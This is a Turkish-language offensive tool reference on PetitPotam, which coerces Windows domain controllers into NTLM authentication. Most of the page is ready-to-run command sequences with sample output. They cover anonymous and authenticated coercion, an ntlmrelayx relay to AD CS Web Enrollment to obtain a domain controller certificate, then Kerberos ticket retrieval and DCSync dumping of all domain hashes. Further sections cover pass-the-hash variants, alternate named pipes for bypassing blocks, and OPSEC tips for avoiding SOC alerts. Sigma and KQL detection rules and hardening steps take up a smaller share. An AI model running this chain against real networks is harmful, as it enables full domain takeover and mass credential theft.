# PetitPotam

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** MS-EFSR (Encrypting File System Remote) protokolünü istismar ederek Windows sistemlerini ve Domain Controller'ları saldırganın dinleyicisine NTLM kimlik doğrulaması göndermeye zorlayan efsanevi koersiyon aracı (CVE-2021-36942).

---

## 1. Genel Bakış ve Amaç

**PetitPotam** (Fransız araştırmacı Gilles Lionel / @topotam77 tarafından keşfedilen ve geliştirilen), Active Directory tarihinin en yıkıcı kimlik doğrulama zorlama (Authentication Coercion) araçlarından biridir. Microsoft'un **MS-EFSR (Encrypting File System Remote Protocol)** mimarisindeki mantıksal bir tasarım zafiyetini istismar eder.

MS-EFSR protokolü, şifrelenmiş dosyaların ağ üzerinden yönetilmesi ve yedeklenmesi için tasarlanmıştır. Bu protokol bünyesindeki `EfsRpcOpenFileRaw` (ve `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv` vb.) fonksiyonu, istemcinin sunucuya uzak bir dosya UNC yolu (`\\attacker\share\test`) belirtmesine imkan tanır. Hedef Windows sunucusu veya Domain Controller, bu çağrıyı aldığında dosyayı açmak üzere **kendi makine hesabı (NT AUTHORITY\SYSTEM)** context'inde belirtilen adrese derhal bir SMB veya HTTP bağlantısı başlatır.

PetitPotam ilk yayınlandığında bu çağrıyı **hiçbir kimlik doğrulaması gerekmeden (Unauthenticated / Anonymous)** yapabilme yeteneğine sahipti. Saldırgan yerel ağa sadece bir kablo takarak etki alanındaki en yetkili sunucuyu (Domain Controller) kendi kontrolündeki `ntlmrelayx` dinleyicisine bağlatabilmekte ve buradan Active Directory Sertifika Servisleri (AD CS Web Enrollment - ESC8) üzerinden saniyeler içinde **Domain Admin TGT bileti** elde edebilmekteydi.

Microsoft'un yayınladığı güvenlik yamalarından (KB5005413) sonra bile PetitPotam, standart bir etki alanı kullanıcısı kimliğiyle veya alternatif RPC named pipe'ları üzerinden çalışmaya devam etmektedir. Hem Python (`PetitPotam.py`) hem de yerel C++ (`PetitPotam.exe`) sürümleri bulunmaktadır.

```
       [ Saldırgan: PetitPotam ]
                   |
     1. MS-EFSR RPC Çağrısı (Port 445 SMB IPC$ / Named Pipe)
        EfsRpcOpenFileRaw("\\192.168.1.50\share\test")
                   |
                   v
       [ Hedef Domain Controller (DC01) ]
                   |
     2. DC01$ Makine Hesabı (SYSTEM Context)
        Saldırgana Doğru Ağ Bağlantısı Başlatır:
                   |
                   v
     =============================================== Ağ (TCP 445 / 80)
                   |
                   v
         [ Dinleyici: ntlmrelayx ] (192.168.1.50)
                   |
     3. NTLMv2 Makine Kimliğini AD CS / LDAP'a Relay Eder
                   |
                   v
         [ AD CS Sertifika Otoritesi ] ===> Domain Admin Sertifikası Üretildi!
```

### Neden Önemli?
- **Domain Controller Ele Geçirme:** Etki alanındaki sıfır yetkili bir noktadan doğrudan DC$ makine hesabının ele geçirilmesini sağlar.
- **ESC8 ile Birleşen Yıkıcılık:** AD CS ortamlarında NTLM Relay koruması (EPA) olmayan HTTP enrollment uç noktalarıyla birleştirildiğinde tüm etki alanını saniyeler içinde ele geçirir.
- **Alternatif Named Pipe Esnekliği:** `\pipe\efsrpc` engellense bile `\pipe\lsarpc`, `\pipe\samr`, `\pipe\netlogon` gibi alternatif borular üzerinden çalışabilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | PetitPotam | SpoolSample (PrinterBug) | DFSCoerce |
|---|---|---|---|
| **Hedef Protokol** | MS-EFSR (EFS Remote) | MS-RPRN (Print Spooler) | MS-DFSNM (DFS Namespace) |
| **Önemli RPC Fonksiyonu** | `EfsRpcOpenFileRaw` | `RpcRemoteFindFirstPrinter...` | `NetrDfsRemoveStdRoot` |
| **DC'de Varsayılan Açık mı?** | Evet (EFS servisi daima açıktır) | Genellikle kapatılır (Spooler) | Evet (DFS kuruluysa) |
| **Anonim Çalışma Yeteneği** | Evet (Yamalanmamış eski DC'lerde) | Hayır (Kimlik doğrulama şart) | Hayır (Kimlik doğrulama şart) |
| **Gereken Servis** | EFS / LSASS | Print Spooler (`spoolsv.exe`) | DFS Namespace Hizmeti |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PetitPotam'ın Python sürümü Impacket altyapısı üzerine inşa edilmiştir.

```bash
# Python Sözdizimi
python3 PetitPotam.py [Seçenekler] <Dinleyici_IP> <Hedef_IP>

# Windows C++ Sözdizimi
PetitPotam.exe <Dinleyici_IP> <Hedef_IP> [Pipe_Numarası]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `<Dinleyici_IP>` | Hedef sunucunun kimlik doğrulamaya zorlanacağı saldırgan IP'si (Zorunlu). | `192.168.1.50` |
| `<Hedef_IP>` | Zorlanacak Windows sunucusu veya Domain Controller IP/FQDN (Zorunlu). | `192.168.1.10` |
| `-u, -username` | RPC kimlik doğrulaması için etki alanı kullanıcısı (Opsiyonel / Yamalı sistemler için). | `-u ahmet` |
| `-p, -password` | Kullanıcının parolası. | `-p Parola123!` |
| `-d, -domain` | Hedef Active Directory etki alanı adı. | `-d lab.local` |
| `-hashes` | Parola yerine NTLM hash kullanımı (LM:NTLM). | `-hashes :e19ccf...` |
| `-pipe` | Kullanılacak named pipe seçeneği (1: efsrpc, 2: lsarpc, 3: samr, 4: netlogon). | `-pipe 2` |
| `-method` | Tetiklenecek EFSR fonksiyonu (Varsayılan: `EfsRpcOpenFileRaw`). | `-method EfsRpcOpenFileRaw` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Klasik Kimlik Doğrulamasız (Anonymous) PetitPotam Tetiklemesi

Yamalanmamış eski Windows Server sistemlerinde hiçbir kullanıcı adı veya parola vermeden doğrudan Domain Controller'ı zorlama.

```bash
python3 PetitPotam.py 192.168.1.50 192.168.1.10
```

```text
[*] Trying on pipe: \pipe\efsrpc
[*] Connecting to \\192.168.1.10\pipe\efsrpc (Anonymous)
[+] Connected to IPC$ as anonymous!
[*] Calling EfsRpcOpenFileRaw with target \\192.168.1.50\test\file...
[+] Got error: ERROR_BAD_NETPATH (0x35) -> Attack worked! Server contacted listener!
```
*Analiz:* DC anonim RPC oturumunu kabul etti ve `192.168.1.50` adresine SMB isteği gönderdi. `ERROR_BAD_NETPATH` hatası saldırının başarılı olduğunu (sunucunun yolu bulmaya çalıştığını) kanıtlar.

---

### Senaryo 2: Standart Etki Alanı Kullanıcısı ile Doğrulanmış Tetikleme (Yamalı Sistemler)

Microsoft'un KB5005413 güncellemesini uygulamış sistemlerde kimlikli olarak çalıştırma.

```bash
python3 PetitPotam.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

```text
[*] Trying on pipe: \pipe\efsrpc
[*] Authenticating as lab.local\can.oz...
[+] Bound to efsrpc RPC interface successfully!
[*] Triggering EfsRpcOpenFileRaw to \\192.168.1.50\share\test...
[+] Success! Target 192.168.1.10 coerced to authenticate to 192.168.1.50.
```
*Analiz:* Düşük yetkili bir kullanıcının kimliğiyle RPC oturumu açıldı ve Domain Controller'ın makine hesabı saldırgana kimlik doğrulamaya zorlandı.

---

### Senaryo 3: PetitPotam ve ntlmrelayx ile AD CS ESC8 Sömürüsü (DCSync ve Domain Admin)

Tüm Active Directory yapısını tek hamlede ele geçiren endüstri standardı saldırı zinciri.

```bash
# Adım 1: ntlmrelayx dinleyicisini AD CS Web Enrollment uç noktasına karşı başlat
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Adım 2: PetitPotam ile Domain Controller'ı ntlmrelayx'e zorla
python3 PetitPotam.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

```text
[ntlmrelayx Konsolu]
[*] HTTP Client connected from 192.168.1.10 (DC01$)
[*] Relaying authentication for LAB\DC01$ to AD CS Web Enrollment...
[+] Successfully requested certificate for LAB\DC01$!
[+] Certificate saved as DC01.pfx (Base64 PKINIT certificate)
```
```bash
# Adım 3: Elde edilen sertifika ile Kerberos TGT al ve DCSync çalıştır
gettgtpkinit.py lab.local/DC01\$ -pfx-base64 <Base64_Sertifika> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass lab.local/DC01\$@192.168.1.10 -just-dc-ntlm
```
*Analiz:* PetitPotam ile tetiklenen DC01 makine hesabı AD CS'e relay edildi; üretilen sertifika ile TGT bileti alındı ve etki alanındaki tüm kullanıcıların NTLM hash'leri (DCSync) çekildi.

---

### Senaryo 4: Alternatif Named Pipe Kullanımı (`\pipe\lsarpc`)

`\pipe\efsrpc` devre dışı bırakılmış veya engellenmişse, LSASS üzerinden çalışan alternatif boruyu seçme.

```bash
python3 PetitPotam.py -u can.oz -p Pass123! -d lab.local -pipe 2 192.168.1.50 192.168.1.10
```

```text
[*] Selecting Named Pipe 2: \pipe\lsarpc
[*] Successfully bound to MS-EFSR interface via lsarpc!
[+] Coercion triggered via EfsRpcOpenFileRaw!
```
*Analiz:* Sistem yöneticileri `efsrpc` borusunu kapatsa dahi `lsarpc` üzerinden EFS fonksiyonu başarıyla çalıştırıldı.

---

### Senaryo 5: Windows C++ İkilisi (`PetitPotam.exe`) ile C2 Beacon Üzerinden Çalıştırma

Ele geçirilmiş bir Windows makinesi içinden yerel C++ derlemesini çalıştırma.

```cmd
PetitPotam.exe 192.168.1.50 192.168.1.10 1
```

```text
Connecting to \\192.168.1.10\pipe\efsrpc
Binding to EFSR Interface...
Calling EfsRpcOpenFileRaw...
Server contacted! Check your listener!
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_ACCESS_DENIED (0x5)` | Hedef sisteme KB5005413 yaması uygulanmış ve anonim erişim engellenmiştir. | Anonim çalıştırmayı bırakıp standart bir etki alanı kullanıcısı bilgisi girin (`-u <kullanıcı> -p <parola>`). |
| `STATUS_OBJECT_NAME_NOT_FOUND (0xc0000034)` | Hedefte belirtilen named pipe (`\pipe\efsrpc`) mevcut değildir. | `-pipe 2` (`lsarpc`) veya `-pipe 3` (`samr`) parametrelerini kullanarak alternatif boruları deneyin. |
| `RPC_S_SERVER_UNAVAILABLE (0x6ba)` | 1. Hedef sunucu IP'si kapalı.<br>2. Port 445 SMB güvenlik duvarı tarafından engellenmektedir. | Hedef IP'yi ve port 445 erişilebilirliğini `nc -zvw 2 <hedef> 445` ile kontrol edin. |
| `ntlmrelayx: Attack failed: Server requires signing (LDAPS / SMB)` | Hedef Domain Controller'da SMB veya LDAP imzalama zorunludur. | Hedef olarak SMB veya LDAP yerine imzalama zorunluluğu olmayan HTTP (AD CS Web Enrollment) seçin. |
| `ERROR_BAD_NETPATH (0x35) çıkması hata mıdır?` | Hayır! Bu bir hata değil, başarılı sömürünün göstergesidir. | Hedef sunucu belirtilen ağ yolunu bulmaya çalıştığını teyit eder; dinleyicinizi kontrol edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 5145 (A network share object was accessed):**
  - Share Name: `\\*\IPC$`
  - Relative Target Name: `efsrpc`, `lsarpc`, `samr`.
  - Access Mask: `0x12019F`.
- **Domain Controller Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Kullanıcı adı: `ANONYMOUS LOGON` (Yamalanmamışsa) veya çağrıyı yapan standart kullanıcı.
- **Sysmon Event ID 3 (Network Connection):**
  - Domain Controller'ın `SYSTEM` hesabı tarafından harici bir IP'nin 445 veya 80 portuna bağlantı açması.

### 5.2 Ağ ve EDR İmzaları
- **MS-EFSR UUID İmzası:** Ağda RPC Bind isteği olarak `c681d488-d850-11d0-8c52-00c04fd90f7e` (MS-EFSR arayüzü) görülmesi.
- **Anormal EfsRpcOpenFileRaw Opnum:** SMB trafiğinde Opnum `0` çağrısının yabancı bir IP parametresiyle gönderilmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | Domain Controller'ı saldırgan dinleyicisine bağlanmaya zorlama. |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and SMB Relay | Tetiklenen makine kimliğini AD CS'e relay etme. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | IPC$ ve named pipe'lar üzerinden RPC arayüzüne erişim. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Anonim Erişim İmzası:** `ANONYMOUS LOGON` SOC alarmlarını doğrudan tetikler. | Yamalanmamış olsa bile geçerli bir kullanıcı hesabı üzerinden bağlanın. |
| **Gereksiz Pipe Denemeleri:** Yanlış pipe seçimi başarısız deneme logları üretir. | Önceden keşif yapıp doğrudan çalışan boruyu (`lsarpc` vb.) hedefleyin. |
| **Tetikleme Sonrası Hız:** Relay başarılı olduğunda dinleyicileri kapatın. | Uzun süre açık bırakılan dinleyiciler ağ anomalisi yaratır. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — PetitPotam İstismarı Tespiti)
```yaml
title: Potential PetitPotam Coercion Attack
status: experimental
description: Domain Controller veya sunucularda efsrpc veya lsarpc üzerinden anormal EfsRpcOpenFileRaw çağrısı.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        ShareName: '\\*\IPC$'
        RelativeTargetName:
            - 'efsrpc'
            - 'lsarpc'
    condition: selection
level: high
```

#### Tespit Kuralı (KQL — Microsoft Sentinel)
```kql
SecurityEvent
| where EventID == 5145
| where ShareName endswith "IPC$"
| where RelativeTargetName in ("efsrpc", "lsarpc")
| project TimeGenerated, Computer, Account, IpAddress, RelativeTargetName
| order by TimeGenerated desc
```

#### Sertleştirme ve Önleme Adımları
1. **Microsoft Güvenlik Yaması (KB5005413):** CVE-2021-36942 yamasının tüm Domain Controller ve Windows Server sistemlerine uygulandığından emin olunmalıdır.
2. **AD CS Web Enrollment Koruması (EPA):** AD CS HTTP arayüzlerinde EPA (Extended Protection for Authentication) aktif edilmeli veya HTTP enrollment tamamen kapatılmalıdır.
3. **RPC Filtreleri Tanımlama:** Netsh veya Windows Filtering Platform (WFP) kuralları ile uzaktan EFSR RPC çağrıları bloklanmalıdır:
   ```cmd
   netsh rpc add filter ...
   ```
4. **SMB İmzalama:** Tüm ağda SMB imzalama zorunlu hale getirilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Kimlik doğrulamalı standart PetitPotam tetiklemesi (En yaygın kullanım)
python3 PetitPotam.py -u ahmet -p Parola123 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** DC'yi `192.168.1.50` dinleyicisine NTLM doğrulaması göndermeye zorlar.
- **Ne Zaman Kullanılır?:** AD CS Relay veya SMB Relay senaryolarında DC'yi tetiklemek için.
- **Parametreler:** `-u/-p/-d`: Standart kimlik bilgileri; `192.168.1.50`: Dinleyici; `192.168.1.10`: Hedef DC.

```bash
# 2. Anonim (Kimliksiz) PetitPotam çalıştırma (Eski sistemler için)
python3 PetitPotam.py 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** Kullanıcı adı ve parola vermeden doğrudan anonim RPC oturumu ile tetikler.
- **Ne Zaman Kullanılır?:** Ortamda hiçbir geçerli kullanıcı hesabı bulunmadığında.
- **Parametreler:** Dinleyici IP ve Hedef IP.

```bash
# 3. NTLM Hash ile Pass-the-Hash çalıştırma
python3 PetitPotam.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** Açık metin parola olmadan NTLM hash ile oturum açıp koersiyon yapar.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca hash çekilebildiğinde.
- **Parametreler:** `-hashes`: LM:NTLM formatı.

```bash
# 4. Alternatif named pipe seçimi (-pipe 2: lsarpc)
python3 PetitPotam.py -u ahmet -p Parola123 -d sirket.local -pipe 2 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** `efsrpc` yerine `lsarpc` borusunu kullanarak savunma engellerini aşar.
- **Ne Zaman Kullanılır?:** `\pipe\efsrpc` erişimi güvenlik ekiplerince kapatıldığında.
- **Parametreler:** `-pipe 2`: lsarpc borusu.

```bash
# 5. ntlmrelayx ile AD CS ESC8 Relay dinleyicisini hazırlama
sudo impacket-ntlmrelayx -t http://ca.sirket.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
- **Ne Yapar?:** PetitPotam'dan gelecek DC makine kimliğini yakalayıp CA'ya relay eder.
- **Ne Zaman Kullanılır?:** PetitPotam komutunu ateşlemeden hemen önce.
- **Parametreler:** `--adcs`: ADCS modu; `--template DomainController`: DC şablonu.

```bash
# 6. Windows C++ derlemesi ile yerel tetikleme
PetitPotam.exe 192.168.1.50 192.168.1.10 1
```
- **Ne Yapar?:** Windows cmd/PowerShell üzerinden yerel C++ ikilisi ile koersiyon başlatır.
- **Ne Zaman Kullanılır?:** Ele geçirilmiş bir Windows hostu veya C2 oturumu üzerinden çalışırken.
- **Parametreler:** `1`: efsrpc pipe seçeneği.

```bash
# 7. SAMR borusu üzerinden alternatif koersiyon (-pipe 3)
python3 PetitPotam.py -u ahmet -p Parola123 -d sirket.local -pipe 3 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** SAMR named pipe'ı üzerinden MS-EFSR arayüzüne bağlanır.
- **Ne Zaman Kullanılır?:** Diğer borular güvenlik duvarı veya erişim kurallarıyla kısıtlandığında.
- **Parametreler:** `-pipe 3`: SAMR named pipe.

```bash
# 8. DCSync ile tüm etki alanı hash'lerini dökme (Zincirin son halkası)
secretsdump.py -k -no-pass sirket.local/DC01\$@192.168.1.10 -just-dc-ntlm
```
- **Ne Yapar?:** PetitPotam ve PKINIT ile elde edilen DC TGT'si ile etki alanının tüm parolalarını çeker.
- **Ne Zaman Kullanılır?:** Sertifika ve TGT alındıktan sonra tam etki alanı kontrolü için.
- **Parametreler:** `-k`: Kerberos bileti kullan; `-just-dc-ntlm`: NTLM hash'lerini dök.

```bash
# 9. EfsRpcEncryptFileSrv fonksiyonu ile alternatif koersiyon (-method)
python3 PetitPotam.py -u ahmet -p Parola123 -d sirket.local -method EfsRpcEncryptFileSrv 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** `EfsRpcOpenFileRaw` yerine `EfsRpcEncryptFileSrv` API çağrısını tetikler.
- **Ne Zaman Kullanılır?:** OpenFileRaw çağrısı EDR veya filtre tarafından bloklandığında.
- **Parametreler:** `-method`: Tetiklenecek RPC fonksiyonu adı.

```bash
# 10. Kerberos biletleri ile kimlik doğrulama (-k)
export KRB5CCNAME=/tmp/user.ccache
python3 PetitPotam.py -k -no-pass -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** NTLM yerine Kerberos TGT kullanarak DC üzerinde RPC oturumu açar.
- **Ne Zaman Kullanılır?:** NTLM kısıtlamalarının (Network Security: Restrict NTLM) devrede olduğu ağlarda.
- **Parametreler:** `-k`: Kerberos bileti kullan; `-no-pass`: Parola girmeden biletle oturum aç.

---

## Kaynaklar

- **Resmi GitHub Deposu (PetitPotam):** [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
- **Microsoft Güvenlik Uyarısı (ADV210003 / CVE-2021-36942):** [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
- **SpecterOps — Certified Pre-Owned (ESC8 AD CS Relay):** [https://posts.specterops.io/certified-pre-owned-d95910965ff2](https://posts.specterops.io/certified-pre-owned-d95910965ff2)

---

> **Önceki:** [← Coercer](./Coercer.md) · **Sonraki:** [SpoolSample →](./SpoolSample.md)

